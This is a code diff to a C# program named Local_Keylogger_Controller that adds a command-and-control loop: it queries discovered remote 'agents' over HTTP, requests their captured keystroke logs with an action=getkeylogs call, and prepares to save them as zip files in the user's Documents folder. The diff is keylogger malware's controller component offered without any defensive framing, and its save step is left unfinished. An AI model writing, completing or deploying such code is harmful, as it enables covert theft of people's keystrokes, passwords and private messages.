@@ -87,7 +87,47 @@ namespace Local_Keylogger_Controller
                 {
                     Console.WriteLine($"- {agent.Ip} : {agent.Port}");
                 }
+
+                using (var client = new HttpClient { Timeout = TimeSpan.FromSeconds(2)})
+                {
+                    foreach (var agent in discoveryAgents)
+                    {
+                        var url = $"http://{agent.Ip}:{agent.Port}/?action=info";
+                        Console.Write($"-> {agent.Ip} : {agent.Port} - Sending start command... ");
+
+                        try
+                        {
+                            string response = await client.GetStringAsync(url);
+                            Console.WriteLine($"OK: \"{response}\"");
+
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"Error sending command to {agent.Ip} : {agent.Port} - {ex.Message}");
+                        }
+                    }
+                    foreach ( var (ip, port) in discoveryAgents)
+                    {
+                        var url = $"http://{ip}:{port}/?action=getkeylogs";
+                        Console.Write($"-> {ip} : {port} - Sending get key log... ");
+
+                        try
+                        {
+                            byte[] zipBytes = await client.GetByteArrayAsync(url);
+
+                            string outPatch = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+                            string patchCombine = Path.Combine(outPatch, $"keylog_{ip}_{port}.zip");
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"Error sending command to {ip} : {port} - {ex.Message}");
+                        }
+                    }
+                }
             }
+
+            Console.WriteLine("\nController work complete. Press any key to exit.");
+            Console.ReadKey();
         }
     }
 }
